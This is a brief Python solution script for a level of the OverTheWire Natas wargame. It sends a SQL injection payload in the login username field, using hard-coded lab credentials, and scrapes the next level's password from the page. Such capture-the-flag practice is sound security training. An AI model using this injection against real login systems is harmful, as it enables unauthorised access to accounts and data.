import requests
import re #regular expressions

username = "natas14"
password = "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8"

url = 'http://%s.natas.labs.overthewire.org/' % username
data = {"username":'" OR 1=1##',"submit":"Login"}

session = requests.Session() #Maintains a session
response = session.post(url , auth=(username, password),data=data)
#response = session.get(url, auth = (username,password))
content = response.text

#print (content)
print (re.findall("natas15 is (.*)<br>",content)[0])
